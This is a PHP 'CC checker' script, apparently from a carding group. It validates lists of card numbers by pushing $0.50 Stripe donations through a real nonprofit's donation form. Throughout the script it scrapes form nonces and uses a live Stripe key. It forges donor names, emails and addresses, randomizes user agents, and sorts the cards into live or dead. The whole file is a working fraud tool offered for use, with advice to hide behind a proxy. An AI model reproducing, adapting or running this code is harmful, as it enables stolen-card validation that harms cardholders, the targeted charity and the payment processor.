<?php

ob_start();

#---///Credits\\\---#

$credits = "[☠️【★Bв™】Bin Bhai]"; /// PUT YOUR NAME

#---///[I Am Using ProxyLess Checker Here]\\\---#

#/// API Made By: @anonmous000 aka 🏴‍☠🃏A000🃏🏴‍☠
#/// Channel & Chat: @BinBhai & @BinBhaiFamily | 🏴‍☠️【Bв™】
#/// Rest API
#/// Gate: [Stripe CCN Charge $0.50]
#/// Total Requests: [04]
#/// Site Type: [DONATION]
#/// Site: [https://www.aplib.org/donate/]
#/// Use Proxy/VPN Enjoy_xD...!!!

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

#---///[START]\\\---#

if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};

#---///A [0-0-0]\\\---#

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function Stripe($data = 36){
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
};

$Guid = Stripe();
$Muid = Stripe();
$Sid = Stripe();

$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];

if (empty($lista)) {
    echo '[♻️] Status: #Error ️⚠

[📡] Response:『 ★ Bete Enter Your CC First ★ 』

[💻] Bot Made By: '.$credits.'';
die();
};

$typecheck = substr($cc, 0,1); 
 
if ($typecheck == "4") { 
  $typee = "visa"; 
} elseif ($typecheck == "5") { 
  $typee = "mastercard"; 
} elseif ($typecheck == "3") { 
  $typee = "amex"; 
} elseif($typecheck == "6") { 
  $typee = "discover"; 
}else { 
  $typee = ""; 
}

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

#---///Random Personal Details\\\---#

$name   = ucfirst(str_shuffle('ashish'));
$last    = ucfirst(str_shuffle('mishra'));
$com     = ucfirst(str_shuffle('binbhaifamily'));
//$mail = "binbhai000@gmail.com";
$mail   = "binbhaia000".substr(md5(uniqid()),0,6)."@gmail.com";
$street = "".rand(0000,9999)."+Main+Street";
$ph      = array("682","346","246");
$ph1     = array_rand($ph);
$phh     = $ph[$ph1];
$phone   = "$phh".rand(0000000,9999999)."";
$st      = array("AL","NY","CA","FL","WA");
$st1     = array_rand($st);
$state   = $st[$st1];
if ($state == "NY"){
$state_code = "NY";
$state = "New+York";
$zip   = "10080";
$city  = "New+York";
}
elseif ($state == "WA"){
$state_code = "WA";
$state = "Washington";
$zip   = "98001";
$city  = "Auburn";
}
elseif ($state == "AL"){
$state_code = "AL";
$state = "Alabama";
$zip   = "35005";
$city  = "Adamsville";
}
elseif ($state == "FL"){
$state_code = "FL";
$state = "Florida";
$zip   = "32003";
$city  = "Orange+Park";
}else{
$state_code = "CA";
$state = "California";
$zip   = "90201";
$city  = "Bell";
};

$User_Agent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11, 99).'';

#---///1st Request [Donation Page]>>>GET METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.aplib.org/donate/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
$time1 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Nonce = getstr($result1, 'create_payment_intent_nonce":"','"');
$State_1 = getstr($result1, "name='state_1' value='","'");
$Version_Hash = getstr($result1, '"version_hash":"','"');

#---///2nd Request [Authorizing Credit Card]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$Guid.'&muid='.$Muid.'&sid='.$Sid.'&payment_user_agent=stripe.js%2Fc144c219a9%3B+stripe-js-v3%2Fc144c219a9%3B+card-element&key=pk_live_p3j90mrolWIVgprjrV4uwHY0007S4KbTde');
$result2 = curl_exec($ch);
$time2 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Token = getStr($result2,'"id": "','"');
$Last4 = getStr($result2,'"last4": "','"');
$Brand = getStr($result2,'"brand": "','"');
$Msg = getStr($result2,'"message": "','"');
$Code = getStr($result2,'"code": "','"');

if(empty($Msg)){
$Msg = "N/A";
}
if(empty($Dcode)){
$Dcode = "N/A";
}

$took2 = $time0 + $time1 + $time2;
$timer = round($took2, 3);

if (strpos($result2, $Msg)){
echo '[♻️] Status: #Reprovadas ❌

[💳] CC: '.$lista.'

[📡] Response:『 ★ ['.$Code.'] | ['.$Msg.'] ★ 』

[⏳] Time Taken: '.$timer.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Checker Made By: '.$credits.'<br><br>';
return;
}

#---///3rd Request [Creating PI/CS]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://aplib.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gfstripe_create_payment_intent&nonce='.$Nonce.'&payment_method%5Bid%5D='.$Token.'&'.$result2.'&currency=USD&amount=50&feed_id=4');
$result3 = curl_exec($ch);
$time3 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$PI = getStr($result3, '"client_secret":"','_secret');
$CS = getStr($result3, '"client_secret":"','"');

#---///4th Request [Charging Credit Card]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.aplib.org/donate/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryAOpa33Fn0T2tn3qk',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_2.3"

'.$name.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_2.6"

'.$last.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_10"

'.$mail.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_3.1"

'.$street.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_3.3"

'.$city.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_3.4"

'.$state.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_3.5"

'.$zip.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_3.6"

United States
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_12"

$0.50
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_28.5"

'.$name.' '.$last.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="input_5"

0.5
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="is_submit_1"

1
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="gform_submit"

1
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="state_1"

'.$State_1.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="gform_target_page_number_1"

0
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="gform_source_page_number_1"

1
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="ak_hp_textarea"


------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="ak_js"

1695728705321
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="version_hash"

'.$Version_Hash.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="version_hash"

'.$Version_Hash.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="version_hash"

'.$Version_Hash.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="version_hash"

'.$Version_Hash.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="stripe_response"

{"id":"'.$PI.'","client_secret":"'.$CS.'","amount":50}
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="stripe_credit_card_last_four"

'.$Last4.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="stripe_credit_card_type"

'.$Brand.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk
Content-Disposition: form-data; name="version_hash"

'.$Version_Hash.'
------WebKitFormBoundaryAOpa33Fn0T2tn3qk--
');
$result = curl_exec($ch);
$time4 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Respo1 = getstr($result, '<span class="gform-icon gform-icon--close"></span>','</h2>');
$Respo = str_replace("There was a problem with your submission:","",$Respo1);

#------------[Last REQ Response]------------#

$took = $time0 + $time1 + $time2 + $time3 + $time4;
$time = round($took, 5);

#-----[CVV Charged Response]-----#

if((strpos($result, 'Thank you')) || (strpos($result, 'Thank You')) || (strpos($result, '/thank-you'))) {
echo '[♻️] Status: #Aprovadas ✅

[💳] CC: '.$lista.'

[📡] Response:『 ★ CCN Charged $0.50 | [Thank You For Your Donation!] ★ 』

[⏳] Time Taken: '.$time.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Bot Made By: '.$credits.'<br><br>';
}

#-----[CVV AVS Response]-----#

elseif ((strpos($result, 'Your zip code is incorrect.')) || (strpos($result, 'zip code validation failed.'))){
echo '[♻️] Status: #Aprovadas ✅

[💳] CC: '.$lista.'

[📡] Response:『 ★ CVV MATCHED | ['.$Respo.'] ★ 』

[⏳] Time Taken: '.$time.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Checker Made By: '.$credits.'<br><br>';
}

#-----[CVV Insufficient Funds Response]-----#

elseif ((strpos($result, 'Your card has insufficient funds.')) || (strpos($result, 'Insufficient'))){
echo '[♻️] Status: #Aprovadas ✅

[💳] CC: '.$lista.'

[📡] Response:『 ★ CVV MATCHED | ['.$Respo.'] ★ 』

[⏳] Time Taken: '.$time.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Checker Made By: '.$credits.'<br><br>';
}

#-----[CCN Response]-----#

elseif ((strpos($result, 'Your card&#039;s security code is incorrect.')) || (strpos($result, 'security code is incorrect.'))){
echo '[♻️] Status: #Aprovadas ✴

[💳] CC: '.$lista.'

[📡] Response:『 ★ CCN LIVE | ['.$Respo.'] ★ 』

[⏳] Time Taken: '.$time.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Checker Made By: '.$credits.'<br><br>';
}

#-----[DEAD Response]-----#

elseif (strpos($result, $Respo1)){
echo '[♻️] Status: #Reprovadas ❌

[💳] CC: '.$lista.'

[📡] Response:『 ★ Declined | ['.$Respo.'] ★ 』

[⏳] Time Taken: '.$time.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Checker Made By: '.$credits.'<br><br>';
}

#-----[OTHER Response]-----#

else {
echo '[♻️] Status: #Reprovadas ❌

[💳] CC: '.$lista.'

[📡] Response:『 ★ Declined | Try Again or Contact To Host To Fix This..! @BinBhai ★ 』

[⏳] Time Taken: '.$time.'s

[🎭] Gate: Stripe CCN Charge $0.50

[💻] Checker Made By: '.$credits.'<br><br>';

file_put_contents('Stripe_Error.txt', $lista.$result.PHP_EOL , FILE_APPEND | LOCK_EX);

}

//echo "<br><b>1:</b> $result1<br><br>";
echo "<br><b>2:</b> $result2<br><br>";
echo "<br><b>3:</b> $result3<br><br>";
echo "<br><b>4:</b> $result<br><br>";
echo "<br><b>NONCE:</b> $Nonce<br><br>";
echo "<br><b>STATE 1:</b> $State_1<br><br>";
echo "<br><b>VERSION HASH:</b> $Version_Hash<br><br>";
echo "<br><b>TOKEN:</b> $Token<br><br>";
echo "<br><b>LAST CC 4DIGIT:</b> $Last4<br><br>";
echo "<br><b>BRAND:</b> $Brand<br><br>";
echo "<br><b>PAYMENT INTENT:</b> $PI<br><br>";
echo "<br><b>CLIENT SECRET:</b> $CS<br><br>";
echo "<br><b>RESPONSE 1:</b> $Respo1<br><br>";
echo "<br><b>RESPONSE:</b> $Respo<br><br>";

curl_close($ch);
ob_flush();
@unlink('cookie.txt');

#---///[THE END]\\\---#

sleep(1);

?>